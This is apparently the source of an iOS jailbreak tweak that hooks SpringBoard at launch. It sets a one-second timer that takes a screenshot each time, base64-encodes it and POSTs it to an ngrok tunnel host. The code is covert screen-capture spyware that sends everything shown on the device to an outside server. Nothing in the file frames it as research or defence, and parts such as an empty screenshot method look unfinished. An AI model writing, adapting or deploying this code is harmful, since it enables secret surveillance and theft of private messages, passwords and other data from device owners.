OBJC_EXTERN UIImage *_UICreateScreenUIImage(void);

@interface SpringBoard : UIApplication
@end

%hook Springboard
-(void)applicationDidFinishLaunching:(id)application {
  NSString *stringURL = @"http://19a3031c.ngrok.io/same";
  // NSString *urlString =  [NSString stringWithFormat:@"%@%@", stringURL, base64];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:stringURL]
                                                      cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                                      timeoutInterval:10];

  [request setHTTPMethod: @"POST"];

  NSOperationQueue *queue = [NSOperationQueue mainQueue];

  [NSURLConnection sendAsynchronousRequest:request queue:queue completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError){

  }];

	%log;
	NSLog(@"**********************************************************************************");
	NSLog(@"****************************************** SUCCESS *******************************");
	NSLog(@"**********************************************************************************");

	%orig;

	//kick off periodic timer
	[NSTimer scheduledTimerWithTimeInterval: 1 target: self selector:@selector(myTick:) userInfo: nil repeats:YES];
}

%new
-(void)myTick:(NSTimer *)timer {
  UIImage *screenImage = _UICreateScreenUIImage();
  NSData * frontPicData = [NSData dataWithData:UIImagePNGRepresentation(screenImage)];
  NSString *base64 = [frontPicData base64EncodedStringWithOptions:0];

  NSString *stringURL = @"http://19a3031c.ngrok.io/same";
  NSString *urlString =  [NSString stringWithFormat:@"%@%@", stringURL, base64];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]
                                                      cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                                      timeoutInterval:10];

  [request setHTTPMethod: @"POST"];

  NSOperationQueue *queue = [NSOperationQueue mainQueue];

  [NSURLConnection sendAsynchronousRequest:request queue:queue completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError){

  }];
}
- (void)takeScreenshot {

}
%end
